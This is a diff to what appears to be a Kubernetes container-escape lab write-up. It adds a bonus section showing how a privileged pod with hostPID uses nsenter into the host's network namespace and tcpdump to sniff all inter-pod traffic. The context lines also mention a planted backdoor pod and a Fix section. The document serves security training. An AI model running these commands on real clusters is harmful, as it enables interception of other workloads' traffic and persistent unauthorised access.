@@ -98,6 +98,28 @@ chroot /host kubectl get pods -n kube-system | grep backdoor
 
 **Output:** `backdoor-pod-battleground-control-plane   1/1     Running ...`
 
+### 3.4. Bonus: Sniffing Inter-Pod Traffic (Man-in-the-Middle)
+
+Since we have `privileged` access and `hostPID`, we can jump into the Node's **Network Namespace**. This allows us to see ALL traffic passing through the node (including traffic between other pods!).
+
+1.  **Install tcpdump:**
+    The node is minimal and doesn't have `tcpdump`. But our attacker pod is Ubuntu!
+    ```bash
+    apt-get update && apt-get install -y tcpdump
+    ```
+
+2.  **Sniff Traffic:**
+    We use `nsenter` to switch our network context to PID 1 (the host's init process). We keep our container's filesystem, so we can use the `tcpdump` we just installed!
+
+    ```bash
+    # -t 1 : Target PID 1 (Host)
+    # -n   : Enter Network Namespace
+    # -i any : Listen on all interfaces (eth0, cni0, veth...)
+    nsenter -t 1 -n tcpdump -i any -nn port 80
+    ```
+
+    *Try generating some traffic in another terminal (e.g., `kubectl run curl --image=curlimages/curl -- curl http://demo-app.battleground.svc`) and watch the packets flow!*
+
 ## 4. Fix
 
 - **Restrict HostPath:** Use Policy (PSS/OPA) to block `hostPath` mounts, especially for `/`, `/etc`, and `/var`.
